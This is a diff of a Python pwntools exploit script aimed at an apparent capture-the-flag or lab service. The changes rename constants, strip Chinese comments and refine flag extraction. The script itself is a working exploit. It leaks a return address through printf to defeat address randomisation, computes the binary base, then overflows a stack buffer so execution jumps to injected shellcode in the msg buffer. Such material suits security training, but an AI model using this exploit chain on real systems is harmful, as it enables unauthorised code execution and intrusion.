@@ -4,15 +4,14 @@ from pwn import *
 import sys
 
 # --- Configuration ---
-OFFSET_RETURN_SITE_FROM_BASE = 0x9c99 # 您之前找到的值
-OFFSET_MSG_FROM_BASE = 0xef220      # 您之前找到的值
+TASK_RETURN_ADDRESS_OFFSET = 0x9c99
+MSG_ADDRESS_OFFSET = 0xef220
 
 context.arch = 'amd64'
 context.os = 'linux'
 context.endian = "little"
-# context.log_level = 'debug' # 取消註解以獲得更詳細的 pwntools 日誌
+# context.log_level = 'debug'
 
-# 正確的、帶迴圈的 75 位元組 shellcode
 shellcode_assembly = """
 jmp short string_data_marker
 
@@ -50,19 +49,17 @@ string_data_marker:
 
 try:
     shellcode = asm(shellcode_assembly)
-    log.info(f"Assembled shellcode length: {len(shellcode)} bytes")
 except PwnlibException as e:
     log.error(f"Error assembling shellcode: {e}")
     sys.exit(1)
 
 # --- Connection ---
 r = remote('up.zoolab.org', 12342)
-# elf = ELF("./bof1") # 如果需要用 ELF 物件輔助，請確保路徑正確
 
 try:
     # --- Stage 1: Trigger Leak with buf1 ---
     # 策略：發送 56 個 'A' 填充到返回位址之前
-    # printf("%s", buf1) 將會印出 "Welcome, " + 56 'A's + (希望是)部分或全部返回位址
+    # printf("%s", buf1) 將會印出 "Welcome, " + 56 'A's + 返回位址
     r.recvuntil(b"What's your name? ")
     
     padding_to_reach_just_before_ret_addr = 56
@@ -75,7 +72,6 @@ try:
     log.info("Attempting to receive data for leak (after sending to buf1)...")
     output_containing_leak = b''
     try:
-        # 接收直到下一個提示，希望能捕獲到洩漏的位址片段
         output_containing_leak = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
     except PwnlibException as e:
         log.error(f"recvuntil timed out or errored waiting for 'What's the room number?': {e}")
@@ -104,10 +100,8 @@ try:
             
         log.info(f"Our {len(leak_trigger_payload)} 'A's payload found starting at index: {start_of_our_As_in_output} in output.")
         
-        # 這是緊跟在我們的 56 個 'A' 之後的資料的起始索引
         start_of_leaked_target_bytes = start_of_our_As_in_output + len(leak_trigger_payload)
         
-        # 我們嘗試從這裡獲取 6 個位元組
         bytes_to_leak_count = 6
         slice_for_partial_addr_end = start_of_leaked_target_bytes + bytes_to_leak_count
 
@@ -130,10 +124,10 @@ try:
         log.warning(f"Constructed address by padding leaked 6 bytes with \\x00\\x00 at MSB: {hex(leaked_ret_addr)}")
         log.success(f"Using this constructed address as 'Leaked return address from task()'")
 
-        executable_base = leaked_ret_addr - OFFSET_RETURN_SITE_FROM_BASE
+        executable_base = leaked_ret_addr - TASK_RETURN_ADDRESS_OFFSET
         log.success(f"Calculated executable base: {hex(executable_base)}")
 
-        address_of_msg = executable_base + OFFSET_MSG_FROM_BASE
+        address_of_msg = executable_base + MSG_ADDRESS_OFFSET
         log.success(f"Calculated address of msg buffer: {hex(address_of_msg)}")
 
     except ValueError as e: 
@@ -149,12 +143,10 @@ try:
         r.interactive()
         sys.exit(1)
 
-    # --- Stage 3: Overflow Stack with read into buf2 ---
-    # 從 buf2 (rbp-0x60) 開始到返回位址 (rbp+8) 的偏移: 0x60 + 8 = 96 + 8 = 104 bytes
+    # --- Stage 3: modity return address ---
     padding_for_buf2_overflow = 104
     overflow_payload_buf2 = b'B' * padding_for_buf2_overflow + p64(address_of_msg)
     log.info(f"Sending overflow payload ({len(overflow_payload_buf2)} bytes) to buf2...")
-    # "\nWhat's the room number? " 提示已被 recvuntil 消耗
     r.sendline(overflow_payload_buf2)
 
     # --- Stage 4: Send benign input for buf3 ---
@@ -173,11 +165,25 @@ try:
     log.success("--- FLAG ---")
     if flag_output:
         try:
-            print(flag_output.decode(errors='ignore').strip())
-        except:
+            decoded_output = flag_output.decode(errors='ignore').strip()
+
+            start_index = decoded_output.find("FLAG{")
+            if start_index != -1:
+                end_index = decoded_output.find("}", start_index)
+                if end_index != -1:
+                    flag_only = decoded_output[start_index : end_index + 1]
+                    print(flag_only)
+                else:
+                    log.warning("Found 'FLAG{' but no closing '}'. Printing what was found.")
+                    print(decoded_output[start_index:])
+            else:
+                log.warning("FLAG pattern 'FLAG{' not found in output. Printing full decoded output.")
+                print(decoded_output)
+        except Exception as e:
+            log.error(f"Error decoding or parsing flag: {e}")
             print(repr(flag_output))
     else:
-        log.warning("No output received for flag, or only 'Thank you!' was received before crash.")
+        log.warning("No flag output received.")
     log.success("--------------")
 
 except PwnlibException as e:
